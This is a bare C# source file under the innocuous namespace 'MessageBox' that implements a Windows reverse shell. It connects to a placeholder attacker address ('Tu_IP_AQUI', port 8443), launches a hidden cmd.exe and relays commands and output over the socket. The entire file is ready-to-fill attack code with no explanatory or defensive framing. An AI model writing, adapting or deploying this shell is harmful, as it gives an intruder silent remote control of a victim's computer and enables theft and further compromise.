using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;

namespace MessageBox
{
  internal class Program
  {
    static StreamWriter streamWriter;

    public static void BackConnect(string ip, int port)
    {
        using (TcpClient client = new TcpClient(ip, port))
        {
            using (Stream stream = client.GetStream())
            {
                using (StreamReader rdr = new StreamReader(stream))
                {
                    streamWriter = new StreamWriter(stream);

                    StringBuilder strInput = new StringBuilder();

                    Process p = new Process();
                    p.StartInfo.FileName = "cmd.exe";
                    p.StartInfo.CreateNoWindow = true;
                    p.StartInfo.UseShellExecute = false;
                    p.StartInfo.RedirectStandardOutput = true;
                    p.StartInfo.RedirectStandardInput = true;
                    p.StartInfo.RedirectStandardError = true;
                    p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                    p.Start();
                    p.BeginOutputReadLine();

                    while (true)
                    {
                        strInput.Append(rdr.ReadLine());
                        p.StandardInput.WriteLine(strInput);
                        strInput.Remove(0, strInput.Length);
                    }
                }
            }
        }
    }

    private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
    {
        StringBuilder strOutput = new StringBuilder();

        if (!string.IsNullOrEmpty(outLine.Data))
        {
            try
            {
                strOutput.Append(outLine.Data);
                streamWriter.WriteLine(strOutput);
                streamWriter.Flush();
            }
            catch (Exception) { }
        }
    }

    static void Main()
    {
        new Run();
    }
  }

  public class Run
  {
    public Run()
    {
        Program.BackConnect("Tu_IP_AQUI", 8443);
    }
  }
}
